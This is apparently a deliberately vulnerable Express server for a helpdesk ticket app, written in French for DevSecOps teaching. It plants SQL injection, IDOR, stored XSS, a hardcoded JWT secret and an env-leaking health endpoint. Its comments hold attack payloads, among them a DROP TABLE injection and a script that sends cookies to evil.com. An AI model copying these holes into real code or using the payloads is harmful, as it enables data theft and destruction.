/**
 * server.js – VERSION VULNÉRABLE (branche feature/vulnerabilities)
 *
 * ⚠️  CE FICHIER CONTIENT VOLONTAIREMENT 4 FAILLES DE SÉCURITÉ
 *      à des fins pédagogiques DevSecOps.
 *      Ne pas déployer en production.
 *
 * Faille 1 – SQL Injection     : recherche non paramétrée (ligne ~90)
 * Faille 2 – XSS stocké        : commentaires sans échappement (ligne ~200)
 * Faille 3 – IDOR              : pas de vérification de propriétaire (ligne ~150)
 * Faille 4 – Secret exposé     : clé JWT hardcodée + debug mode (lignes ~20-25)
 */

const express = require("express");
const cors = require("cors");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const pool = require("./db");

const app = express();
const PORT = process.env.PORT || 3000;

// ══════════════════════════════════════════════════════════════════
// FAILLE 4 – SECRET EXPOSÉ + DEBUG MODE
// La clé JWT est hardcodée en clair dans le code source.
// Le mode debug expose les stack traces complètes aux clients.
// ══════════════════════════════════════════════════════════════════
const JWT_SECRET = "super-secret-123";   // ❌ Secret hardcodé dans le code
const DEBUG = true;                       // ❌ Debug actif en production

app.use(cors({ origin: "*" }));           // ❌ CORS ouvert à tout le monde
app.use(express.json());

// Middleware debug : expose les erreurs internes aux clients
app.use((err, req, res, next) => {
  if (DEBUG) {
    // ❌ Stack trace complète envoyée au client → fuite d'infos
    return res.status(500).json({ error: err.message, stack: err.stack });
  }
  res.status(500).json({ error: "Erreur interne" });
});

// ─── Initialisation DB ────────────────────────────────────────────
async function initialiserBaseDeDonnees() {
  await pool.query(`CREATE SEQUENCE IF NOT EXISTS ticket_number_seq START WITH 1043;`);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS tickets (
      id VARCHAR(20) PRIMARY KEY DEFAULT ('HD-' || nextval('ticket_number_seq')),
      titre VARCHAR(200) NOT NULL, demandeur VARCHAR(120) NOT NULL,
      categorie VARCHAR(50) NOT NULL, priorite VARCHAR(20) NOT NULL,
      statut VARCHAR(30) NOT NULL DEFAULT 'Ouvert', created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS utilisateurs (
      id SERIAL PRIMARY KEY, identifiant VARCHAR(60) UNIQUE NOT NULL,
      mot_de_passe TEXT NOT NULL, role VARCHAR(20) NOT NULL DEFAULT 'utilisateur'
    );
  `);
  await pool.query(`
    CREATE TABLE IF NOT EXISTS commentaires (
      id SERIAL PRIMARY KEY, ticket_id VARCHAR(20) NOT NULL REFERENCES tickets(id) ON DELETE CASCADE,
      auteur VARCHAR(120) NOT NULL, contenu TEXT NOT NULL, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
    );
  `);
  await pool.query(`
    INSERT INTO tickets (id, titre, demandeur, categorie, priorite, statut) VALUES
      ('HD-1042','Problème de connexion','admin','Compte','Haute','Ouvert'),
      ('HD-1041','Installation de Teams','youssef','Logiciel','Normale','En cours')
    ON CONFLICT (id) DO NOTHING;
  `);
  const h = await bcrypt.hash("agent1234", 12);
  const u = await bcrypt.hash("user1234", 12);
  await pool.query(`
    INSERT INTO utilisateurs (identifiant, mot_de_passe, role) VALUES
      ('agent',$1,'agent'),('admin',$1,'agent'),('youssef',$2,'utilisateur')
    ON CONFLICT (identifiant) DO NOTHING;
  `, [h, u]);
}

// ─── Auth ─────────────────────────────────────────────────────────
app.post("/api/auth/login", async (req, res) => {
  const { identifiant, motDePasse } = req.body;
  const r = await pool.query(
    "SELECT * FROM utilisateurs WHERE identifiant = $1", [identifiant]
  );
  if (r.rowCount === 0 || !await bcrypt.compare(motDePasse, r.rows[0].mot_de_passe))
    return res.status(401).json({ message: "Identifiant ou mot de passe incorrect." });
  const token = jwt.sign({ id: r.rows[0].id, identifiant, role: r.rows[0].role }, JWT_SECRET, { expiresIn: "8h" });
  res.json({ token, utilisateur: { id: r.rows[0].id, identifiant, role: r.rows[0].role } });
});

function verifierToken(req, res, next) {
  const h = req.headers["authorization"];
  if (!h) return res.status(401).json({ message: "Token manquant." });
  try { req.utilisateur = jwt.verify(h.split(" ")[1], JWT_SECRET); next(); }
  catch { res.status(401).json({ message: "Token invalide." }); }
}

// ══════════════════════════════════════════════════════════════════
// FAILLE 1 – SQL INJECTION
// La valeur ?q= est concaténée directement dans la requête SQL
// sans paramétrage. Un attaquant peut injecter du SQL arbitraire.
//
// Exemple d'attaque :
//   GET /api/tickets?q=' OR '1'='1
//   GET /api/tickets?q='; DROP TABLE tickets; --
// ══════════════════════════════════════════════════════════════════
app.get("/api/tickets", verifierToken, async (req, res) => {
  const { q } = req.query;
  try {
    let sql;
    if (q) {
      // ❌ INJECTION SQL : concaténation directe de l'entrée utilisateur
      sql = `SELECT * FROM tickets WHERE titre LIKE '%${q}%' OR demandeur LIKE '%${q}%' ORDER BY created_at DESC`;
      const r = await pool.query(sql); // ← vecteur d'attaque
      return res.json(r.rows);
    }
    const r = await pool.query("SELECT * FROM tickets ORDER BY created_at DESC");
    res.json(r.rows);
  } catch (e) {
    res.status(500).json({ message: e.message, sql: e.query }); // ❌ Fuite d'infos SQL
  }
});

// ══════════════════════════════════════════════════════════════════
// FAILLE 3 – IDOR (Insecure Direct Object Reference)
// Aucune vérification que l'utilisateur est propriétaire du ticket.
// Un "utilisateur" peut lire n'importe quel ticket en devinant l'ID.
//
// Exemple d'attaque :
//   GET /api/tickets/HD-1042   (connecté en tant que youssef)
//   → retourne le ticket de admin sans vérification
// ══════════════════════════════════════════════════════════════════
app.get("/api/tickets/:id", verifierToken, async (req, res) => {
  // ❌ IDOR : pas de vérification du propriétaire
  const r = await pool.query("SELECT * FROM tickets WHERE id = $1", [req.params.id]);
  if (r.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });
  res.json(r.rows[0]); // ← retourne le ticket à n'importe qui
});

app.post("/api/tickets", verifierToken, async (req, res) => {
  const { titre, demandeur, categorie, priorite, statut } = req.body;
  const r = await pool.query(
    `INSERT INTO tickets (titre,demandeur,categorie,priorite,statut) VALUES ($1,$2,$3,$4,$5) RETURNING *`,
    [titre, demandeur, categorie, priorite, statut || "Ouvert"]
  );
  res.status(201).json(r.rows[0]);
});

app.patch("/api/tickets/:id/statut", verifierToken, async (req, res) => {
  const r = await pool.query(
    `UPDATE tickets SET statut=$1 WHERE id=$2 RETURNING *`, [req.body.statut, req.params.id]
  );
  if (r.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });
  res.json(r.rows[0]);
});

app.delete("/api/tickets/:id", verifierToken, async (req, res) => {
  const r = await pool.query("DELETE FROM tickets WHERE id=$1 RETURNING id", [req.params.id]);
  if (r.rowCount === 0) return res.status(404).json({ message: "Ticket introuvable." });
  res.json({ message: "Supprimé.", id: r.rows[0].id });
});

// ─── Commentaires ─────────────────────────────────────────────────
app.get("/api/tickets/:id/comments", verifierToken, async (req, res) => {
  const r = await pool.query(
    "SELECT * FROM commentaires WHERE ticket_id=$1 ORDER BY created_at ASC", [req.params.id]
  );
  res.json(r.rows);
});

// ══════════════════════════════════════════════════════════════════
// FAILLE 2 – XSS STOCKÉ (Stored Cross-Site Scripting)
// Le contenu des commentaires est stocké et renvoyé tel quel,
// sans aucun échappement ou sanitisation HTML.
//
// Exemple d'attaque :
//   POST /api/tickets/HD-1042/comments
//   { "contenu": "<script>document.location='https://evil.com?c='+document.cookie</script>" }
//   → Le script sera exécuté dans le navigateur de chaque visiteur
// ══════════════════════════════════════════════════════════════════
app.post("/api/tickets/:id/comments", verifierToken, async (req, res) => {
  const { contenu } = req.body;
  // ❌ XSS : aucune validation, aucun échappement du contenu HTML
  const r = await pool.query(
    `INSERT INTO commentaires (ticket_id,auteur,contenu) VALUES ($1,$2,$3) RETURNING *`,
    [req.params.id, req.utilisateur.identifiant, contenu] // ← vecteur XSS
  );
  res.status(201).json(r.rows[0]);
});

app.get("/api/health", async (req, res) => {
  // ❌ Faille 4 bis : expose la version Node et les variables d'environnement
  res.json({
    status: "ok",
    version: process.version,
    env: process.env,          // ← FUITE TOTALE des secrets en mémoire
    jwtSecret: JWT_SECRET,     // ← Expose la clé JWT
  });
});

async function demarrerServeur() {
  await initialiserBaseDeDonnees();
  app.listen(PORT, () => console.log(`Backend vulnérable sur http://localhost:${PORT}`));
}

demarrerServeur();